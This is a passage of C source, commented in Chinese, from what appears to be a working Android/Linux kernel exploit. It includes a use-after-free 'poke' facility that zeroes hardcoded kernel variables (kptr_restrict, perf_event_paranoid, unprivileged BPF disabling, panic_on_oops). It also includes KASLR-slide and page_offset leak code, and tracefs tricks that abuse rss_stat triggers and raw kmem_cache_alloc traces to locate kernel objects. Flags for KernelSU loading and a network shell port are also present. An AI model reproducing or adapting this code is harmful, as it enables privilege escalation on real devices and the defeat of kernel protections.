{
    uint64_t bits = g_va_bits, mask;

    if (bits < 20 || bits > 52) bits = g_va_bits = GK_DEFAULT_VA_BITS;
    mask = ((UINT64_C(1) << (bits - 2)) - 1) & ~(GK_SZ_2M - 1);
    g_slide_min = UINT64_C(1) << (bits - 3);
    g_slide_max = g_slide_min + mask;
}

static int slide_in_window(uint64_t d)
{
    if (d & (GK_SZ_2M - 1)) return 0;
    if (g_slide_max_user) return d <= g_slide_max;
    return d >= g_slide_min && d <= g_slide_max;
}
static int      g_kaslr_only;    /* 仅泄露 KASLR slide：校准 A 完成即退出 */
static int      g_lmap_only;     /* 仅泄露 page_offset：校准 B 完成即退出 */

/* ---- 写零直通车：--poke ------------------------------------------------
 * 不经提权链，只把 8 字节 0 写到指定内核地址。is_link=1 表示参数是画像
 * 里的链接地址，运行时加 g_slide；否则按绝对值直接用（/proc/kallsyms 抄
 * 下来的就是绝对值）。每次 poke 消耗一次 UAF，并留下一个 --exec-hold
 * 守墓进程——这是必要的，树已经脏了，收尸就 oops。 */
#define MAX_POKES 32
/* 目标类型。前两种来自命令行，后三种来自画像里的符号：
 * 参数解析按出现顺序进行，--poke-kptr 完全可能排在 --profile 前面，
 * 所以符号地址不能在这里查，要等 run_pokes() 时画像已经定下来再展开。 */
enum poke_kind {
    POKE_ABS,           /* 命令行给的运行时绝对地址 */
    POKE_LINK,          /* 命令行给的链接地址，+g_slide */
    POKE_SYM_KPTR,      /* 画像里的 kptr_restrict */
    POKE_SYM_PARANOID,  /* 画像里的 sysctl_perf_event_paranoid（写其 8 字节槽） */
    POKE_SYM_PANIC,     /* 画像里的 panic_on_oops（写其 8 字节槽） */
};
struct poke_ent { uint64_t addr; int kind; const char *why; };
static struct poke_ent g_pokes[MAX_POKES];
static int      g_npoke;
static int      g_poke_retry = 3;   /* 每个地址最多试几次 */
static int      g_cred_only;     /* 仅探测一次 cred 分配地址：取到即退出 */
static int      g_timer_pin_failed; /* timer_probe 里 pin_cpu(0) 是否失败 */
/* 实际生效的 per-cpu ring buffer 大小（KB）。disarm_all() 会把它压到 7，
 * 之后写 16384 在部分 ROM 上不生效，2048 条记录就只剩最后几十条。 */
static int      g_buffer_kb;
static int      g_no_ksu;        /* 跳过 KernelSU late-load */
static int      g_netshell_port = 9826;

static uint64_t slide_addr(uint64_t link) { return link + g_slide; }

/* --- 阶段状态 marker（宿主原本靠 \x1e C98260_STATUS 解析进度） ------------ */
#define STATUS_MARKER "\x1e" "C98260_STATUS"

/* --- 阶段状态 marker：宿主靠 \x1e C98260_STATUS 解析进度，必须是纯文本 --- */
static void emit_status(const char *stage, const char *status)
{
    fprintf(stdout, "%s %s %s\n", STATUS_MARKER, stage, status);
    fflush(stdout);
}
#define STAGE_LOG(fmt, ...) do { \
    clog_line(stage_color(fmt), "[%s] " fmt, __func__, ##__VA_ARGS__); \
} while (0)

/* ==========================================================================
 * 通用工具：tracefs 读写 / CPU 绑定 / 日志落盘
 * 原项目：uaf_plant.c:171-333、calib.c 的同名函数
 * ========================================================================== */
/* 6.1.134 的 int panic_on_oops：.data，符号类型 D（不是 T）。
 * 运行时 = 链接地址 + g_slide，统一走 slide_addr()。
 * 紧随其后的 panic_timeout（+4，原 -1）会被 8 字节 store 一并清 0；
 * 0 与 -1 都是 panic 后不重启，保留现场反而更好。 */
#define KADDR_PANIC_ON_OOPS UINT64_C(0xffffffc00a02bfa8)

/* ---- 暴露 /proc/kallsyms 的两个开关 -------------------------------------
 * kptr_restrict（int，D 段）@ +0x201d5f8，8 字节对齐，紧跟其后的 4 字节
 * 是 padding（下一符号 ptr_key 在 +8），所以 8 字节写零只清它自己。
 * sysctl_perf_event_paranoid（int）@ +0x200ba7c 本身不是 8 字节对齐，
 * 但它前一个 4 字节是 sysctl_unprivileged_bpf_disabled，两者拼成
 * 0xffffffc00a00ba78 这个 8 字节槽；写零同时清 paranoid 和解禁非特权
 * BPF，都是「放宽」方向，无功能破坏。 */
#define KADDR_KPTR_RESTRICT     UINT64_C(0xffffffc00a01d5f8)
#define KADDR_BPF_PARANOID_PAIR UINT64_C(0xffffffc00a00ba78)

#define TRACE   "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"

static void log_sync(void) { (void)fdatasync(STDOUT_FILENO); }

static int write_file_mode(const char *path, const char *text, int extra)
{
    int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
    ssize_t n;
    size_t len = strlen(text);
    if (fd < 0) {
        int e = errno;
        LOG_V1("[tracefs] 打开失败 %s errno=%d (%s)", path, e, strerror(e));
        /* trigger_cmd() 依赖 errno==EEXIST 判定重复注册；strerror 可能改
         * errno，显式恢复，保证 -v 不改变任何控制流。 */
        errno = e;
        return -1;
    }
    n = write(fd, text, len);
    int e = errno;
    close(fd);
    if (n != (ssize_t)len) {
        LOG_V1("[tracefs] 写入失败 %s n=%zd/%zu errno=%d (%s)",
               path, n, len, e, strerror(e));
        errno = e;
        return -1;
    }
    LOG_V3("[tracefs] 写成功 %s (%zu 字节)", path, len);
    return 0;
}
static int write_file(const char *path, const char *text)
{ return write_file_mode(path, text, 0); }

/* 设 buffer 并回读真实值。tracefs 的 buffer_size_kb 写入不保证生效
 * （部分 ROM 上限被裁到 7 KB/核），而 trace_pipe_raw 是全消费读，
 * buffer 一旦只有 7 KB，2048 条 k_itimer 记录只剩最后 ~120 条，
 * 众数照样能算 —— 前提是窗口内不要再灌噪声记录。 */
static int set_buffer_kb(int kb)
{
    char want[32], buf[32] = {0};
    int fd;
    ssize_t r;

    snprintf(want, sizeof(want), "%d\n", kb);
    write_file(TRACE "/buffer_size_kb", want);
    fd = open(TRACE "/buffer_size_kb", O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
        r = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (r > 0) {
            buf[r] = 0;
            g_buffer_kb = atoi(buf);
        }
    }
    if (g_buffer_kb <= 0) {
        LOG_WARN("[buffer] 读不到 buffer_size_kb，按 7 KB/核 估算");
        g_buffer_kb = 7;
    } else if (g_buffer_kb < kb / 2) {
        LOG_WARN("[buffer] 请求 %d KB/核，实际只有 %d KB/核（约 %d 条 48B 记录），"
                 "本轮窗口会按这个容量裁剪 timer 数量", kb, g_buffer_kb,
                 g_buffer_kb * 1024 / 48);
    } else {
        LOG_V1("[buffer] %d KB/核（约 %d 条 48B 记录容量）",
               g_buffer_kb, g_buffer_kb * 1024 / 48);
    }
    return g_buffer_kb;
}

/* -v 环境自检：纯只读，不改 trace 状态。一眼看出哪个 tracefs 节点不可写，
 * 直接解释「直接写被拒 errno=..」以及校准 B 无样本的断点。 */
static void verbose_env_probe(void)
{
    static const char *nodes[] = {
        TRACE, TRACE "/tracing_on", TRACE "/trace", TRACE "/buffer_size_kb",
        TRACE "/events/kmem/kmem_cache_alloc/enable",
        TRACE "/events/kmem/mm_page_alloc/enable",
        TRACE "/events/kmem/rss_stat/enable",
        TRACE "/events/kmem/rss_stat/trigger",
        TRACE "/per_cpu/cpu0/trace",
        TRACE "/per_cpu/cpu0/trace_pipe_raw",
        "/sys/fs/selinux/enforce",
    };
    struct utsname u;
    if (g_verbose < 1) return;
    if (uname(&u) == 0)
        LOG_V1("[env] kernel=%s arch=%s pid=%d uid=%u euid=%u",
               u.release, u.machine, (int)getpid(), getuid(), geteuid());
    for (size_t i = 0; i < sizeof(nodes) / sizeof(nodes[0]); i++) {
        int r = access(nodes[i], R_OK) == 0;
        int w = access(nodes[i], W_OK) == 0;
        LOG_V1("[env] %-62s R=%s W=%s", nodes[i], r ? "Y" : "N", w ? "Y" : "N");
    }
}

static int trigger_cmd(const char *text)
{
    LOG_V2("[trigger] %s", text);
    if (!write_file(TRIGGER, text)) return 0;
    return errno == EEXIST ? 0 : -1;
}

/* 只 touch 一页触发一次 rss_stat 事件。rss_stat 的 enable 由调用方在
 * 整个采集窗口内保持为 1——原项目 calib.c:kick_rss 就是这个语义。
 * 旧版在这里写完 "1" 又立刻写 "0"，会把窗口内的 rss_stat 关掉，
 * 使挂在 rss_stat/trigger 上的 enable_event:... 命令永远不被触发。 */
static int kick_rss(void)
{
    unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page != MAP_FAILED) {
        ((volatile unsigned char *)page)[0] = 1;
        munmap(page, 4096);
    }
    return 0;
}

/* 批量制造 rss_stat 事件，跨过 TASK_RSS_EVENTS_THRESH。
 *
 * 这是 raw=0 的真正根因，不是 kick 时序问题。
 *
 * 内核的 rss_stat tracepoint 挂在 mm 的 RSS 计数器上，只有该任务的
 * RSS 变化量累积跨过 TASK_RSS_EVENTS_THRESH（64 页）时才会真正触发。
 * kick_rss() 只 touch 1 页 —— 计数器刚被 flush 时这一页根本跨不过阈值，
 * rss_stat 事件不发生，挂在它上面的 enable_event:kmem:kmem_cache_alloc
 * 就永远不会执行，kmem_cache_alloc 一直停在 soft-disabled（enable 回读
 * "1*"），于是一条记录都没有。
 *
 * 每轮 mmap 1 MiB、逐页写入 256 页（>> 64），munmap 时再产生一轮减少，
 * 保证每个 round 都至少跨一次阈值。 */
static void stir_rss(int rounds)
{
    const size_t pages = 256;
    const size_t len = pages * 4096u;
    for (int r = 0; r < rounds; r++) {
        unsigned char *m = mmap(NULL, len, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (m == MAP_FAILED) break;
        for (size_t p = 0; p < pages; p++)
            m[p * 4096u] = (unsigned char)(r + (int)p);
        munmap(m, len);
    }
}

/* 通用 kmem 事件启用，对齐原项目 calib.c:arm_kmem_event。
 *   1) 优先直接写 events/kmem/<name>/enable；
 *   2) 部分 ROM 会拒绝直接写，则把 "enable_event:kmem:<name>" 挂到
 *      rss_stat/trigger 上，临时打开 rss_stat 并 kick 一次让命令生效；
 *   3) 仍失败则返回 -1，由调用方中止（绝不静默继续）。
 * 校准 B 旧版对 mm_page_alloc 只做了裸 write_file 且不检查返回值，
 * 事件没启用时 text trace 里一行都没有，order1_pfns 必然为 0。 */
/* -v：回读目标事件的 enable 值。trigger 回退只是「注册规则」，真正启用
 * 要等宿主 rss_stat 命中；此处回读到 0 正是校准 B 无样本的关键证据。 */
static void verbose_event_state(const char *name)
{
    char path[192], buf[16] = {0};
    ssize_t r;
    int fd;
    if (g_verbose < 1) return;
    snprintf(path, sizeof(path), TRACE "/events/kmem/%s/enable", name);
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        int e = errno;
        LOG_V1("[arm] 回读 %s 失败 errno=%d (%s)", name, e, strerror(e));
        return;
    }
    r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    buf[r > 0 ? (size_t)r : 0] = 0;
    LOG_V1("[arm] %s/enable 回读=%s", name, r > 0 ? buf : "(空)");
    if (r > 0 && strchr(buf, '*'))
        LOG_V2("[arm] %s 是 soft 模式（%s）：由 trigger 借道启用。"
               "本 ROM 上该状态仍会记录；若整轮无样本再考虑这条", name, buf);
}

/* 精确回读事件状态：
 *   0 = 关闭
 *   1 = hard-enabled（真正在记录）
 *   2 = "1*"，由 trigger 挂上但仍然 soft-disabled
 * 这三者必须分开：以前把 "1*" 也当成功，日志显示「已启用」，实际一条
 * 记录都没进环 —— 整个 raw=0 就是这么被掩盖掉的。 */
static int event_state(const char *name)
{
    char path[192], buf[16] = {0};
    ssize_t r;
    int fd;

    snprintf(path, sizeof(path), TRACE "/events/kmem/%s/enable", name);
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    r = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (r <= 0) return 0;
    buf[r] = 0;
    if (buf[0] != '1') return 0;
    return strchr(buf, '*') ? 2 : 1;
}

/* 触到 hard-enabled 为止。必须用 stir_rss 而不是 kick_rss：单页 touch
 * 跨不过 TASK_RSS_EVENTS_THRESH(64 页)，trigger 根本不会执行。 */
static int wait_event_enabled(const char *name, int tries)
{
    for (int i = 0; i < tries; i++) {
        int st = event_state(name);
        if (st == 1) {
            if (i) LOG_V1("[arm] %s 在第 %d 轮 stir 后 hard-enabled", name, i);
            return 0;
        }
        stir_rss(2);
        struct timespec nap = { .tv_nsec = 20000000L };
        nanosleep(&nap, NULL);
    }
    return event_state(name) == 1 ? 0 : -1;
}
static int arm_kmem_event(const char *name)
{    char path[192], cmd[128];
    snprintf(path, sizeof(path), TRACE "/events/kmem/%s/enable", name);
    if (!write_file(path, "1\n")) {
        int st = event_state(name);
        if (st == 1) {
            STAGE_LOG("已直接启用 %s", name);
            verbose_event_state(name);
            return 0;
        }
        /* 写被接受但回读仍是 "1*"：事件登记上了却没真正记录，继续走 trigger */
        LOG_V1("[arm] 直接写 %s 被接受但回读=%s，仍走 trigger 路径", name,
               st == 2 ? "1*（soft-disabled）" : "0");
    }
    {
        int e = errno;
        LOG_V1("[arm] 直接写 %s 被拒 errno=%d (%s)；改走 rss_stat trigger 借道",
               path, e, strerror(e));
    }
    snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s\n", name);
    if (!trigger_cmd(cmd)) {
        int st;
        LOG_V1("[arm] 已在 " TRIGGER " 注册规则：%s", cmd);
        write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
        /* 跨过 64 页阈值，让 enable_event 真正执行一次 */
        for (int t = 0; t < 24; t++) {
            stir_rss(2);
            st = event_state(name);
            if (st == 1) break;
            struct timespec nap = { .tv_nsec = 20000000L };
            nanosleep(&nap, NULL);
        }
        st = event_state(name);
        LOG_V1("[arm] trigger 落定：%s enable=%s rss_stat_enable=%s",
               name, st == 1 ? "1" : (st == 2 ? "1*" : "0"),
               event_state("rss_stat") == 1 ? "1" : "0");
        if (st != 1) {
            LOG_WARN("[arm] %s 仍是 %s：stir 没跨过 TASK_RSS_EVENTS_THRESH，"
                     "或该内核改了阈值 —— 窗口内大概率零记录", name,
                     st == 2 ? "soft-disabled(1*)" : "disabled");
        }
        STAGE_LOG("直接写被拒，改用 trigger 回退启用 %s", name);
        return 0;
    }
    LOG_ERR("无法启用 %s（tracefs 不可写或事件不存在）", name);
    return -1;
}
static int arm_kmem_cache_alloc(void) { return arm_kmem_event("kmem_cache_alloc"); }
static void disarm_kmem_cache_alloc(void)
{
    write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
    trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
    kick_rss();
    trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
    trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
}
static int trace_off_on(void)
{
    if (write_file(TRACE "/tracing_on", "0\n") ||
        write_file_mode(TRACE "/trace", "", O_TRUNC)) return -1;
    return write_file(TRACE "/tracing_on", "1\n");
}
static void quiet_reclaim_trace(void)
{
    write_file(TRACE "/tracing_on", "0\n");
    trigger_cmd("!enable_event:kmem:mm_page_free\n");
    trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
    trigger_cmd("disable_event:kmem:mm_page_free\n");
    trigger_cmd("disable_event:kmem:mm_page_alloc\n");
    kick_rss();
    trigger_cmd("!disable_event:kmem:mm_page_free\n");
    trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
    write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
    write_file(TRACE "/buffer_size_kb", "7\n");
}
static void disarm_all(void)
{
    write_file(TRACE "/tracing_on", "0\n");
    /* rss_stat 需保持开启，下面的 disable_event trigger 才会被 kick 触发 */
    write_file(TRACE "/events/kmem/rss_stat/enable", "1\n");
    trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
    trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
    trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
    trigger_cmd("!enable_event:kmem:mm_page_free\n");
    trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
    trigger_cmd("disable_event:kmem:kmem_cache_free\n");
    trigger_cmd("disable_event:kmem:mm_page_alloc\n");
    trigger_cmd("disable_event:kmem:mm_page_free\n");
    kick_rss();
    trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
    trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
    trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
    trigger_cmd("!disable_event:kmem:mm_page_free\n");
    /* 直接写 enable=0 兜底，对齐原项目 calib.c:calib_disarm */
    write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
    write_file(TRACE "/events/kmem/kmem_cache_free/enable", "0\n");
    write_file(TRACE "/events/kmem/mm_page_alloc/enable", "0\n");
    write_file(TRACE "/events/kmem/mm_page_free/enable", "0\n");
    write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
    write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
    write_file(TRACE "/buffer_size_kb", "7\n");
}

static int cpu_count(void)
{
    char buf[128] = {0}, *p;
    int fd, n = 0;
    ssize_t got;
    fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 8;
    got = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (got <= 0) return 8;
    for (p = buf; *p; ) {
        int v = 0;
        if (*p < '0' || *p > '9') { p++; continue; }
        while (*p >= '0' && *p <= '9') v = v * 10 + (*p++ - '0');
        if (v + 1 > n) n = v + 1;
    }
    return n < 1 ? 8 : (n > 16 ? 16 : n);
}
static int pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set); CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

/* 内核虚拟地址 -> 物理页帧号。page_offset 必须是本次启动实测值，
 * 否则 PFN 全错，回填命中判定必然失败（这正是校准 B 存在的意义）。 */
static uint64_t object_pfn(uint64_t ptr)
{ return ((ptr & ~UINT64_C(0xfff)) - P.page_offset) >> 12; }

/* 兼容 "pfn=0x1a2b" 与 "pfn=1a2b" 两种内核/ROM 打印格式。
 * 原项目 calib.c 用 strstr("pfn=") + %llx，不强制 0x 前缀；
 * 旧版只认 "pfn=0x"，碰到不打印 0x 的内核会整批漏掉。 */
static uint64_t parse_pfn(const char *line)
{
    const char *p = strstr(line, "pfn=");
    char *end = NULL;
    uint64_t v;
    if (!p) return UINT64_MAX;
    p += 4;
    if (p[0] == '0' && (p[1] == 'x' || p[1] == 'X')) p += 2;
    v = strtoull(p, &end, 16);
    if (end == p) return UINT64_MAX;
    return v;
}
static int trace_seen(const char *kind, uint64_t pfn)
{
    int ncpu = cpu_count();
    for (int cpu = 0; cpu < ncpu; cpu++) {
        char path[128], line[768];
        FILE *f;
        snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
        f = fopen(path, "r");
        if (!f) continue;
        while (fgets(line, sizeof(line), f)) {
            if (!strstr(line, kind)) continue;
            /* 按数值比，不按字符串：有的内核打印 pfn=1a2b 不带 0x，
             * 拼 "pfn=0x.." 会整批漏掉。 */
            if (parse_pfn(line) == pfn) { fclose(f); return 1; }
        }
        fclose(f);
    }
    return 0;
}

/* ==========================================================================
 * raw trace 采集与扫描
 * trace_pipe_raw 里 kmem_cache_alloc 记录的布局：
 *   [i-8]=trace_entry(含 pid@i-4) [i]=call_site [i+8]=ptr
 *   [i+16]=bytes_req [i+24]=bytes_alloc
 * 原项目：uaf_plant.c:618-732、calib_core.c:calib_scan_kitimer
 * ========================================================================== */
static uint8_t *g_raw;
static size_t   g_rawcap;
static uint8_t *raw_buf(size_t need)
{
    uint8_t *p;
    if (g_rawcap >= need) return g_raw;
    p = realloc(g_raw, need);
    if (!p) return NULL;
    g_raw = p; g_rawcap = need;
    return g_raw;
}
static size_t capture_raw_cpu(int cpu, uint8_t *buf, size_t cap)
{
    char path[128];
    size_t used = 0;
    int fd;
    snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) return 0;
    for (;;) {
        ssize_t n = read(fd, buf + used, cap - used);
        if (n <= 0) break;
        used += (size_t)n;
        if (used + 65536 >= cap) break;
    }
    close(fd);
    return used;
}
static int online_cpus(void)
{
    long n = sysconf(_SC_NPROCESSORS_CONF);
    return (n > 0 && n <= 64) ? (int)n : 1;
}

/* 所有 CPU 的 per_cpu ring buffer 拼进同一个 buffer。
 * 只读 cpu0 是校准 A 之前最大的盲点：进程被调度到别的核时，2048 条记录
 * 全在那边，cpu0 只剩 1/8 —— 正好对上日志里 raw=12288（约 256 条）。 */
static size_t capture_raw_all(uint8_t *buf, size_t cap)
{
    size_t used = 0;
    int n = online_cpus();
    for (int c = 0; c < n && used + 65536 < cap; c++) {
        size_t got = capture_raw_cpu(c, buf + used, cap - used);
        if (got) LOG_V1("[raw] cpu%d=%zu 字节", c, got);
        used += got;
    }
    return used;
}

/* ---- 流式采集：reader 子进程 + pipe + poll ------------------------------
 * 事后一次性读 trace_pipe_raw 是三重赌：
 *   ① tracing_on=0 之后再 open，pipe 可能立刻 EOF（raw=0 就是这么来的）；
 *   ② ring buffer 里的旧记录会被系统噪声从环头覆盖；
 *   ③ trace_pipe_raw 是消费式读，"最新"那一段之外的内容都读不回来。
 *
 * 上游 calib.c 的模型是 `timeout N dd ... trace_pipe_raw` 起多个子进程
 * 边写边读。这里用 fork + pipe + poll 复刻：reader 在 tracing_on=1
 * **之前**就阻塞在 read 上，整个窗口持续把数据排进 pipe，父进程 poll
 * 收集到 buffer，probe 结束时数据已经全在手上了。
 * ========================================================================= */
#define CAP_MAX_CPU 16

struct cap_ctx {
    int      fds[CAP_MAX_CPU];
    pid_t    pids[CAP_MAX_CPU];
    int      n;
    uint8_t *buf;
    size_t   cap;
    size_t   len;
};

static uint64_t mono_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000u + (uint64_t)(ts.tv_nsec / 1000000);
}

/* 子进程：阻塞读 trace_pipe_raw，转发到 pipe。父进程死了写端会 EPIPE，
 * 这个进程随之退出。 */
static void cap_child(const char *path, int wfd)
{
    char tmp[65536];
    int in = open(path, O_RDONLY);
    if (in < 0) _exit(1);
    for (;;) {
        ssize_t got = read(in, tmp, sizeof(tmp));
        if (got < 0) {
            if (errno == EINTR) continue;
            break;
        }
        if (got == 0) break;
        if (write(wfd, tmp, (size_t)got) != got) break;
    }
    close(in);
    _exit(0);
}

static int cap_start(struct cap_ctx *c, uint8_t *buf, size_t cap, int ncpu)
{
    memset(c, 0, sizeof(*c));
    c->buf = buf;
    c->cap = cap;
    for (int cpu = 0; cpu < ncpu && c->n < CAP_MAX_CPU; cpu++) {
        char path[128];
        int pfd[2];
        pid_t pid;
        snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
        if (access(path, R_OK)) {
            LOG_V2("[cap] cpu%d 的 trace_pipe_raw 不可读", cpu);
            continue;
        }
        if (pipe(pfd)) continue;
        pid = fork();
        if (pid == 0) {
            close(pfd[0]);
            cap_child(path, pfd[1]);
            _exit(1);
        }
        close(pfd[1]);
        if (pid < 0) { close(pfd[0]); continue; }
        c->fds[c->n] = pfd[0];
        c->pids[c->n] = pid;
        c->n++;
    }
    if (!c->n) {
        LOG_ERR("[cap] 没有可用的 trace_pipe_raw（SELinux 或 ROM 精简节点）");
        return -1;
    }
    LOG_V1("[cap] readers=%d 已在 probe 之前启动", c->n);
    return 0;
}

static void cap_poll(struct cap_ctx *c, uint64_t deadline_ms)
{
    struct pollfd pf[CAP_MAX_CPU];
    while (mono_ms() < deadline_ms && c->len < c->cap) {
        uint64_t remain = deadline_ms - mono_ms();
        int wait_ms = remain > 200u ? 200 : (int)remain;
        int ready, open_cnt = 0;
        for (int i = 0; i < c->n; i++) {
            pf[i].fd = c->fds[i];
            pf[i].events = POLLIN;
            pf[i].revents = 0;
            if (c->fds[i] >= 0) open_cnt++;
        }
        /* 所有 reader 都已退出（open 失败或 pipe 断了），没必要再等到 deadline */
        if (!open_cnt) break;
        ready = poll(pf, (nfds_t)c->n, wait_ms);
        if (ready <= 0) {
            if (ready < 0 && errno != EINTR) break;
            continue;
        }
        for (int i = 0; i < c->n; i++) {
            ssize_t got;
            if (c->fds[i] < 0 || !(pf[i].revents & POLLIN)) continue;
            if (c->cap - c->len < 65536) break;
            got = read(c->fds[i], c->buf + c->len, c->cap - c->len);
            if (got > 0) {
                c->len += (size_t)got;
            } else if (got == 0 || (errno != EINTR && errno != EAGAIN)) {
                close(c->fds[i]);
                c->fds[i] = -1;
            }
        }
    }
}

static void cap_finish(struct cap_ctx *c)
{
    int alive = 0;
    for (int i = 0; i < c->n; i++) {
        int st;
        if (c->fds[i] >= 0) { alive++; close(c->fds[i]); }
        kill(c->pids[i], SIGKILL);
        while (waitpid(c->pids[i], &st, 0) < 0 && errno == EINTR) { }
    }
    LOG_V1("[cap] readers=%d still_open=%d raw=%zu 字节", c->n, alive, c->len);
}

static uint64_t rd_u64(const uint8_t *p) { uint64_t v; memcpy(&v, p, 8); return v; }

static int cmp_u64(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static inline uint16_t rd_u16(const uint8_t *p) { uint16_t v; memcpy(&v, p, 2); return v; }

/* 采集窗口里一条 kmem_cache_alloc 都没命中时，用文本 trace 反证原因：
 *   kmem_cache_alloc=0 且 rss_stat>0 -> 事件被 soft-disable，trigger 未生效
 *   kmem_cache_alloc>0               -> raw 布局或画像 kitimer_size 不匹配
 * 文本 trace 的 call_site 是符号名（do_timer_create+0xa8），比 raw 里的
 * 裸地址直观得多，也是判断「画像对不对」最快的证据。 */
/* trace_pipe_raw 是全消费读：先读 raw，/trace 就只剩几行残留。所以文本
 * trace 必须在 capture_raw_all() **之前**抓下来，失败时再打印。
 * 抓取本身只读，不影响采集。 */
static int  g_ev_done, g_ev_total, g_ev_kmem, g_ev_rss, g_ev_nsamples;
static char g_ev_samples[5][256];

static void snapshot_trace_evidence(void)
{
    static const char *paths[] = { TRACE "/per_cpu/cpu0/trace", TRACE "/trace" };
    g_ev_done = g_ev_total = g_ev_kmem = g_ev_rss = g_ev_nsamples = 0;
    for (int p = 0; p < 2; p++) {
        FILE *f = fopen(paths[p], "r");
        char line[512];
        int total = 0, kmem = 0, rss = 0;
        if (!f) continue;
        while (fgets(line, sizeof(line), f)) {
            size_t n;
            total++;
            if (strstr(line, "rss_stat")) rss++;
            if (!strstr(line, "kmem_cache_alloc")) continue;
            kmem++;
            /* 前 5 条 kmem 样本原文照抄：call_site 是符号名
             * （do_timer_create+0xa8），比 raw 裸地址直观得多，
             * 也是判断画像 timer_link 对不对最快的证据。 */
            if (g_ev_nsamples < 5) {
                n = strlen(line);
                while (n && (line[n - 1] == '\n' || line[n - 1] == '\r'))
                    line[--n] = 0;
                snprintf(g_ev_samples[g_ev_nsamples], sizeof(g_ev_samples[0]),
                         "%s", line);
                g_ev_nsamples++;
            }
        }
        fclose(f);
        if (!total) continue;
        g_ev_total = total;
        g_ev_kmem = kmem;
        g_ev_rss = rss;
        g_ev_done = 1;
        return;
    }
}

static void dump_trace_evidence(void)
{
    if (!g_ev_done) {
        LOG_WARN("[evidence] text trace 也是空的：tracing_on 或 buffer 没建立");
        return;
    }
    for (int i = 0; i < g_ev_nsamples; i++)
        LOG_V1("[evidence] %s", g_ev_samples[i]);
    LOG_WARN("[evidence] text trace 行=%d kmem_cache_alloc=%d rss_stat=%d",
             g_ev_total, g_ev_kmem, g_ev_rss);
    if (!g_ev_kmem && g_ev_rss)
        LOG_WARN("[evidence] 只有 rss_stat：kmem_cache_alloc 处于 soft-disable，"
                 "trigger 在采集窗口内没有生效");
}

/* 失败时的第二个证据：按 event id 精确挑出 kmem_cache_alloc 记录，统计
 * (bytes_req, bytes_alloc) 直方图。最热的那一行若不是画像里的
 * kitimer_size，就说明画像字段与本次内核不匹配，用
 *   --set kitimer_size=0x..
 * 覆盖即可，不必重编。 */
static int kmem_event_id(const char *name)
{
    char path[192], v[16] = {0};
    int fd;
    ssize_t n;
    snprintf(path, sizeof(path), TRACE "/events/kmem/%s/id", name);
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    n = read(fd, v, sizeof(v) - 1);
    close(fd);
    if (n <= 0) return -1;
    return atoi(v);
}

static void dump_kmem_size_hist(const uint8_t *buf, size_t used)
{
    struct { uint64_t req, alloc; int n; } top[16];
    int ntop = 0, id = kmem_event_id("kmem_cache_alloc");
    memset(top, 0, sizeof(top));
    if (id < 0) {
        LOG_WARN("[evidence] 读不到 kmem_cache_alloc/id，跳过尺寸直方图");
        return;
    }
    for (size_t i = 24; i + 16 < used; i++) {
        uint64_t req, alloc;
        int slot = -1;
        if (rd_u16(buf + i - 24) != (uint16_t)id) continue;
        req = rd_u64(buf + i);
        alloc = rd_u64(buf + i + 8);
        if (req > 8192 || alloc > 8192) continue;
        for (int k = 0; k < ntop; k++)
            if (top[k].req == req && top[k].alloc == alloc) { slot = k; break; }
        if (slot < 0) {
            if (ntop == (int)(sizeof(top) / sizeof(top[0]))) continue;
            slot = ntop++;
            top[slot].req = req;
            top[slot].alloc = alloc;
        }
        top[slot].n++;
    }
    if (!ntop) {
        LOG_WARN("[evidence] raw 里没有 type=%d 的记录：事件其实没记录，"
                 "或 trace_entry 布局与预期不符", id);
        return;
    }
    for (int k = 0; k < ntop; k++)
        LOG_WARN("[evidence] kmem_cache_alloc req=%#" PRIx64
                 " alloc=%#" PRIx64 " x%d%s", top[k].req, top[k].alloc,
                 top[k].n, top[k].req == P.kitimer_size ? "  <= 画像尺寸" : "");
}

